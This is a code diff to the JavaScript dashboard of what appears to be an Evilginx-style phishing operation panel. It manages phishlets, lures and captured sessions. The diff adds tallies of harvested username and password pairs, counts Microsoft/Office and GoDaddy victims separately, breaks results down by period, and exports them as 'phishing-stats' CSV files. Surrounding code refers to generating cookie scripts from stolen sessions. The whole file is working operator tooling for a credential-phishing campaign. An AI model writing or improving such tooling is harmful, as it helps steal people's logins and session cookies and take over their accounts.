@@ -23,6 +23,23 @@ const luresCountElement = document.getElementById('lures-count');
 const sessionsCountElement = document.getElementById('sessions-count');
 const credentialsCountElement = document.getElementById('credentials-count');
 
+// Dashboard statistics elements added
+const visitsCountElement = document.getElementById('visits-count');
+const successLoginsCountElement = document.getElementById('success-logins-count');
+const failedLoginsCountElement = document.getElementById('failed-logins-count');
+const officeLoginsCountElement = document.getElementById('office-logins-count');
+
+// Period statistics elements
+const todayVisits = document.getElementById('today-visits');
+const todaySuccess = document.getElementById('today-success'); 
+const todayFailed = document.getElementById('today-failed');
+const weekVisits = document.getElementById('week-visits');
+const weekSuccess = document.getElementById('week-success');
+const weekFailed = document.getElementById('week-failed');
+const monthVisits = document.getElementById('month-visits');
+const monthSuccess = document.getElementById('month-success');
+const monthFailed = document.getElementById('month-failed');
+
 // Base API URL
 const API_BASE_URL = window.location.origin + '/api';
 
@@ -616,7 +633,119 @@ async function toggleLure(id, enable) {
 
 // ================= UI Functions =================
 
-// Update dashboard
+// Calculate statistics based on session data
+function calculateStatistics(sessionsData) {
+    const stats = {
+        totalVisits: sessionsData.length,
+        successfulLogins: 0,
+        failedLogins: 0,
+        officeLogins: 0,
+        godaddyLogins: 0,
+        
+        // Time period stats
+        today: {
+            visits: 0,
+            success: 0,
+            failed: 0
+        },
+        week: {
+            visits: 0,
+            success: 0,
+            failed: 0
+        },
+        month: {
+            visits: 0,
+            success: 0,
+            failed: 0
+        }
+    };
+    
+    // Current date for period calculations
+    const now = new Date();
+    const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
+    const weekStart = new Date(now.getFullYear(), now.getMonth(), now.getDate() - now.getDay()).getTime();
+    const monthStart = new Date(now.getFullYear(), now.getMonth(), 1).getTime();
+    
+    sessionsData.forEach(session => {
+        // Convert timestamp to date object
+        let timestamp = 0;
+        if (session.create_time) timestamp = session.create_time * 1000;
+        else if (session.CreateTime) timestamp = session.CreateTime * 1000;
+        else if (session.created) timestamp = session.created;
+        else if (session.timestamp) timestamp = session.timestamp;
+        
+        // Period statistics
+        if (timestamp >= todayStart) {
+            stats.today.visits++;
+        }
+        if (timestamp >= weekStart) {
+            stats.week.visits++;
+        }
+        if (timestamp >= monthStart) {
+            stats.month.visits++;
+        }
+        
+        // Check for successful login
+        const hasUsername = session.username && session.username.length > 0;
+        const hasPassword = session.password && session.password.length > 0;
+        
+        if (hasUsername && hasPassword) {
+            stats.successfulLogins++;
+            
+            // Check for period
+            if (timestamp >= todayStart) {
+                stats.today.success++;
+            }
+            if (timestamp >= weekStart) {
+                stats.week.success++;
+            }
+            if (timestamp >= monthStart) {
+                stats.month.success++;
+            }
+            
+            // Check for service type
+            const username = (session.username || '').toLowerCase();
+            const phishlet = (session.phishlet || '').toLowerCase();
+            
+            if (username.includes('@') && (
+                username.endsWith('@microsoft.com') || 
+                username.endsWith('@outlook.com') || 
+                username.endsWith('@hotmail.com') || 
+                username.endsWith('@live.com') ||
+                phishlet.includes('office') || 
+                phishlet.includes('microsoft') || 
+                phishlet.includes('o365')
+            )) {
+                stats.officeLogins++;
+            }
+            
+            if (username.includes('@') && (
+                phishlet.includes('godaddy') || 
+                username.includes('godaddy')
+            )) {
+                stats.godaddyLogins++;
+            }
+        } else if (hasUsername || hasPassword) {
+            // Partial credentials - failed login
+            stats.failedLogins++;
+            
+            // Check for period
+            if (timestamp >= todayStart) {
+                stats.today.failed++;
+            }
+            if (timestamp >= weekStart) {
+                stats.week.failed++;
+            }
+            if (timestamp >= monthStart) {
+                stats.month.failed++;
+            }
+        }
+    });
+    
+    return stats;
+}
+
+// Enhanced update dashboard function
 async function updateDashboard() {
     try {
         updateLastUpdated();
@@ -641,6 +770,28 @@ async function updateDashboard() {
             }
         });
         credentialsCountElement.textContent = credCount;
+        
+        // Calculate and display extended statistics
+        const stats = calculateStatistics(sessionsData);
+        
+        // Update main stats
+        visitsCountElement.textContent = stats.totalVisits;
+        successLoginsCountElement.textContent = stats.successfulLogins;
+        failedLoginsCountElement.textContent = stats.failedLogins;
+        officeLoginsCountElement.textContent = stats.officeLogins;
+        
+        // Update period stats
+        todayVisits.textContent = stats.today.visits;
+        todaySuccess.textContent = stats.today.success;
+        todayFailed.textContent = stats.today.failed;
+        
+        weekVisits.textContent = stats.week.visits;
+        weekSuccess.textContent = stats.week.success;
+        weekFailed.textContent = stats.week.failed;
+        
+        monthVisits.textContent = stats.month.visits;
+        monthSuccess.textContent = stats.month.success;
+        monthFailed.textContent = stats.month.failed;
         
         // Update recent sessions table
         const recentSessionsTable = document.getElementById('recent-sessions-table');
@@ -1072,7 +1223,8 @@ function formatDate(dateString) {
 
 // Toggle sidebar navigation
 menuToggle.addEventListener('click', function() {
-    sidebar.classList.toggle('active');
+    sidebar.classList.toggle('collapsed');
+    content.classList.toggle('expanded');
 });
 
 // Navigate between tabs
@@ -1080,35 +1232,34 @@ navLinks.forEach(link => {
     link.addEventListener('click', function(e) {
         e.preventDefault();
         
-        // Remove active class from all links
-        document.querySelectorAll('.sidebar-nav a').forEach(a => {
-            a.classList.remove('active');
+        // Remove active class from all links and tabs
+        navLinks.forEach(function(l) {
+            l.parentElement.classList.remove('active');
+        });
+        tabContents.forEach(function(tab) {
+            tab.classList.remove('active');
         });
         
-        // Add active class to current link
-        this.classList.add('active');
-        
-        // Hide all tab contents
-        document.querySelectorAll('.tab-content').forEach(tab => {
-            tab.style.display = 'none';
-        });
-        
-        // Show content of active tab
+        // Add active class to clicked link and corresponding tab
+        this.parentElement.classList.add('active');
         const targetId = this.getAttribute('data-target');
-        const targetTab = document.getElementById(targetId);
-        if (targetTab) {
-            targetTab.style.display = 'block';
-            
-            // Update data based on active tab
-            if (targetId === 'phishlets-tab') {
-                fetchPhishlets().then(data => populatePhishletsTable(data));
-            } else if (targetId === 'lures-tab') {
-                fetchLures().then(data => populateLuresTable(data));
-            } else if (targetId === 'sessions-tab') {
-                fetchSessions().then(data => populateSessionsTable(data));
-            } else if (targetId === 'dashboard-tab') {
+        document.getElementById(targetId).classList.add('active');
+        
+        // Load tab-specific data
+        const tabName = targetId.replace('-tab', '');
+        switch(tabName) {
+            case 'phishlets':
+                fetchPhishlets().then(populatePhishletsTable);
+                break;
+            case 'lures':
+                fetchLures().then(populateLuresTable);
+                break;
+            case 'sessions':
+                fetchSessions().then(populateSessionsTable);
+                break;
+            case 'dashboard':
                 updateDashboard();
-            }
+                break;
         }
     });
 });
@@ -1186,97 +1337,98 @@ async function updateCertificates() {
 
 // ================= Initialization =================
 
-// Initialize page on load
+// Initialize the dashboard when DOM is loaded
 document.addEventListener('DOMContentLoaded', function() {
-    // Initialize dashboard
-    checkAuthentication()
-        .then(() => {
-            updateDashboard();
-            setupEventListeners();
-        })
-        .catch(error => {
-            console.error('Authentication error:', error);
-            // Redirect to login page if not authenticated
-            window.location.href = '/static/login.html';
-        });
-
-    // Auto refresh dashboard every 60 seconds
+    setupEventListeners();
+    updateDashboard();
+    
+    // Auto-refresh dashboard every 60 seconds
     setInterval(updateDashboard, 60000);
 });
 
-// Setup event listeners for interactive elements
+// Setup event listeners
 function setupEventListeners() {
-    // Navigation tabs
-    const navLinks = document.querySelectorAll('.sidebar-nav a');
-    navLinks.forEach(link => {
+    // Sidebar toggle
+    menuToggle.addEventListener('click', function() {
+        sidebar.classList.toggle('collapsed');
+        content.classList.toggle('expanded');
+    });
+
+    // Tab navigation
+    navLinks.forEach(function(link) {
         link.addEventListener('click', function(e) {
             e.preventDefault();
-            const targetId = this.getAttribute('data-target');
-            const tabContent = document.getElementById(targetId);
             
-            // Remove active class from all tabs
-            document.querySelectorAll('.tab-content').forEach(tab => {
+            // Remove active class from all links and tabs
+            navLinks.forEach(function(l) {
+                l.parentElement.classList.remove('active');
+            });
+            tabContents.forEach(function(tab) {
                 tab.classList.remove('active');
             });
             
-            // Add active class to clicked tab
-            tabContent.classList.add('active');
-            
-            // Update navigation active state
-            document.querySelectorAll('.sidebar-nav li').forEach(li => {
-                li.classList.remove('active');
-            });
+            // Add active class to clicked link and corresponding tab
             this.parentElement.classList.add('active');
+            const targetId = this.getAttribute('data-target');
+            document.getElementById(targetId).classList.add('active');
             
-            // Special case for sessions tab - refresh data
-            if (targetId === 'sessions-tab') {
-                fetchSessions().then(populateSessionsTable);
-            }
-            // Special case for phishlets tab - refresh data
-            else if (targetId === 'phishlets-tab') {
-                fetchPhishlets().then(populatePhishletsTable);
-            }
-            // Special case for lures tab - refresh data
-            else if (targetId === 'lures-tab') {
-                fetchLures().then(populateLuresTable);
+            // Load tab-specific data
+            const tabName = targetId.replace('-tab', '');
+            switch(tabName) {
+                case 'phishlets':
+                    fetchPhishlets().then(populatePhishletsTable);
+                    break;
+                case 'lures':
+                    fetchLures().then(populateLuresTable);
+                    break;
+                case 'sessions':
+                    fetchSessions().then(populateSessionsTable);
+                    break;
+                case 'dashboard':
+                    updateDashboard();
+                    break;
             }
         });
     });
 
-    // مستمع لزر تنزيل الكوكيز
-    document.getElementById('download-cookies-btn').addEventListener('click', function() {
-        downloadCookiesScript();
-    });
+    // Button event listeners
+    const refreshDashboardBtn = document.getElementById('refresh-dashboard');
+    if (refreshDashboardBtn) {
+        refreshDashboardBtn.addEventListener('click', updateDashboard);
+    }
     
-    // مستمعات الأحداث لعلامات تبويب نافذة تفاصيل الجلسة
-    const tabItems = document.querySelectorAll('.tab-item');
-    tabItems.forEach(item => {
-        item.addEventListener('click', function() {
-            // إزالة التنشيط من جميع علامات التبويب
-            document.querySelectorAll('.tab-item').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            // إضافة التنشيط للعلامة المحددة
-            this.classList.add('active');
-            
-            // إخفاء جميع المحتويات
-            document.querySelectorAll('.tab-pane').forEach(pane => {
-                pane.classList.remove('active');
-            });
-            
-            // إظهار المحتوى المرتبط بعلامة التبويب المحددة
-            const targetTabId = this.getAttribute('data-tab');
-            document.getElementById(targetTabId).classList.add('active');
-        });
-    });
+    const exportStatsBtn = document.getElementById('export-stats');
+    if (exportStatsBtn) {
+        exportStatsBtn.addEventListener('click', exportStatistics);
+    }
     
-    // إغلاق نافذة تفاصيل الجلسة
-    document.querySelectorAll('.modal-cancel, .modal .close').forEach(btn => {
-        btn.addEventListener('click', function() {
-            document.getElementById('session-view-modal').style.display = 'none';
+    if (phishletsRefreshBtn) {
+        phishletsRefreshBtn.addEventListener('click', function() {
+            fetchPhishlets().then(populatePhishletsTable);
         });
-    });
+    }
+    
+    if (luresRefreshBtn) {
+        luresRefreshBtn.addEventListener('click', function() {
+            fetchLures().then(populateLuresTable);
+        });
+    }
+    
+    if (createLureBtn) {
+        createLureBtn.addEventListener('click', showCreateLureModal);
+    }
+    
+    if (updateCertificatesBtn) {
+        updateCertificatesBtn.addEventListener('click', updateCertificates);
+    }
+    
+    // Logout button
+    if (logoutBtn) {
+        logoutBtn.addEventListener('click', function() {
+            localStorage.removeItem('authToken');
+            window.location.href = '/login';
+        });
+    }
 }
 
 // Add download cookies script
@@ -1435,4 +1587,86 @@ function downloadCookiesScript(sessionData) {
     
     // إظهار رسالة نجاح
     showToast('نجاح', 'تم إنشاء سكريبت الكوكيز بنجاح وطباعته في سجلات المتصفح', 'success');
+}
+
+// Export statistics to CSV
+function exportStatistics() {
+    try {
+        // Get current stats data
+        const stats = {
+            total: {
+                visits: parseInt(visitsCountElement.textContent) || 0,
+                success: parseInt(successLoginsCountElement.textContent) || 0,
+                failed: parseInt(failedLoginsCountElement.textContent) || 0,
+                office: parseInt(officeLoginsCountElement.textContent) || 0
+            },
+            today: {
+                visits: parseInt(todayVisits.textContent) || 0,
+                success: parseInt(todaySuccess.textContent) || 0,
+                failed: parseInt(todayFailed.textContent) || 0
+            },
+            week: {
+                visits: parseInt(weekVisits.textContent) || 0,
+                success: parseInt(weekSuccess.textContent) || 0,
+                failed: parseInt(weekFailed.textContent) || 0
+            },
+            month: {
+                visits: parseInt(monthVisits.textContent) || 0,
+                success: parseInt(monthSuccess.textContent) || 0,
+                failed: parseInt(monthFailed.textContent) || 0
+            }
+        };
+        
+        // Create CSV content
+        let csvContent = "data:text/csv;charset=utf-8,";
+        
+        // Add headers
+        csvContent += "Category,Metric,Value\n";
+        
+        // Add total stats
+        csvContent += "Total,Visits," + stats.total.visits + "\n";
+        csvContent += "Total,Successful Logins," + stats.total.success + "\n";
+        csvContent += "Total,Failed Logins," + stats.total.failed + "\n";
+        csvContent += "Total,Office Logins," + stats.total.office + "\n";
+        
+        // Add today stats
+        csvContent += "Today,Visits," + stats.today.visits + "\n";
+        csvContent += "Today,Successful Logins," + stats.today.success + "\n";
+        csvContent += "Today,Failed Logins," + stats.today.failed + "\n";
+        
+        // Add week stats
+        csvContent += "This Week,Visits," + stats.week.visits + "\n";
+        csvContent += "This Week,Successful Logins," + stats.week.success + "\n";
+        csvContent += "This Week,Failed Logins," + stats.week.failed + "\n";
+        
+        // Add month stats
+        csvContent += "This Month,Visits," + stats.month.visits + "\n";
+        csvContent += "This Month,Successful Logins," + stats.month.success + "\n";
+        csvContent += "This Month,Failed Logins," + stats.month.failed + "\n";
+        
+        // Create download link
+        const encodedUri = encodeURI(csvContent);
+        const link = document.createElement("a");
+        link.setAttribute("href", encodedUri);
+        
+        // Get current date for filename
+        const now = new Date();
+        const dateStr = now.getFullYear() + '-' + 
+                       String(now.getMonth() + 1).padStart(2, '0') + '-' + 
+                       String(now.getDate()).padStart(2, '0');
+        
+        link.setAttribute("download", "phishing-stats-" + dateStr + ".csv");
+        document.body.appendChild(link);
+        
+        // Click the link to trigger download
+        link.click();
+        
+        // Clean up
+        document.body.removeChild(link);
+        
+        showToast('Success', 'Statistics exported successfully', 'success');
+    } catch (error) {
+        console.error('Error exporting statistics:', error);
+        showToast('Error', 'Failed to export statistics', 'error');
+    }
 } 
